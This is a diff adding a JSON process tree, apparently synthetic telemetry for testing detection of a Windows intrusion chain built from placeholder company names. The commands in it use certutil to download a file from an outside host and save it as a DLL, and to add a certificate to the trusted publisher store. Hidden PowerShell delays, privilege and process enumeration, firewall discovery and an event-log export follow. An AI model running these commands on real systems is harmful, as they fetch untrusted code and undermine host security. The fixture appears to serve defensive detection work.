@@ -1,0 +1,157 @@
+{
+  "pid": 185088,
+  "ppid": 0,
+  "name": "services.exe",
+  "command": "services.exe -k netsvcs",
+  "children": [
+    {
+      "pid": 185093,
+      "ppid": 185088,
+      "name": "cmd.exe",
+      "command": "cmd.exe /k \"echo maintenance step\"",
+      "children": [
+        {
+          "pid": 185097,
+          "ppid": 185093,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/tools/support.cab\" \"C:\\ProgramData\\Fabrikam\\Client\\helper.dll\"",
+          "children": [
+            {
+              "pid": 185099,
+              "ppid": 185097,
+              "name": "powershell.exe",
+              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 20\"",
+              "children": [
+                {
+                  "pid": 185104,
+                  "ppid": 185099,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe /priv",
+                  "children": [
+                    {
+                      "pid": 185107,
+                      "ppid": 185104,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /priv",
+                      "children": []
+                    }
+                  ]
+                },
+                {
+                  "pid": 185111,
+                  "ppid": 185099,
+                  "name": "certutil.exe",
+                  "command": "certutil.exe -addstore TrustedPublisher \"C:\\Users\\Public\\corp_root.cer\"",
+                  "children": [
+                    {
+                      "pid": 185116,
+                      "ppid": 185111,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe",
+                      "children": [
+                        {
+                          "pid": 185122,
+                          "ppid": 185116,
+                          "name": "whoami.exe",
+                          "command": "whoami.exe /all",
+                          "children": [
+                            {
+                              "pid": 185124,
+                              "ppid": 185122,
+                              "name": "tasklist.exe",
+                              "command": "tasklist.exe /svc",
+                              "children": [
+                                {
+                                  "pid": 185139,
+                                  "ppid": 185124,
+                                  "name": "netsh.exe",
+                                  "command": "netsh.exe advfirewall show allprofiles > \"C:\\ProgramData\\Northwind\\Logs\\net_a31fef0d.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 185141,
+                                      "ppid": 185139,
+                                      "name": "powershell.exe",
+                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 19\"",
+                                      "children": [
+                                        {
+                                          "pid": 185143,
+                                          "ppid": 185141,
+                                          "name": "tasklist.exe",
+                                          "command": "tasklist.exe /v",
+                                          "children": [
+                                            {
+                                              "pid": 185144,
+                                              "ppid": 185143,
+                                              "name": "wevtutil.exe",
+                                              "command": "wevtutil.exe epl \"Application\" \"C:\\ProgramData\\Northwind\\Logs\\Application_ec9bed90.evtx\"",
+                                              "children": [
+                                                {
+                                                  "pid": 185145,
+                                                  "ppid": 185144,
+                                                  "name": "choice.exe",
+                                                  "command": "choice.exe /d y /t 19 > nul",
+                                                  "children": []
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 185125,
+      "ppid": 185088,
+      "name": "hostname.exe",
+      "command": "hostname.exe",
+      "children": [
+        {
+          "pid": 185126,
+          "ppid": 185125,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 18\"",
+          "children": [
+            {
+              "pid": 185128,
+              "ppid": 185126,
+              "name": "whoami.exe",
+              "command": "whoami.exe",
+              "children": [
+                {
+                  "pid": 185129,
+                  "ppid": 185128,
+                  "name": "ping.exe",
+                  "command": "ping.exe -n 22 127.0.0.1 > nul",
+                  "children": [
+                    {
+                      "pid": 185132,
+                      "ppid": 185129,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /groups",
+                      "children": []
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
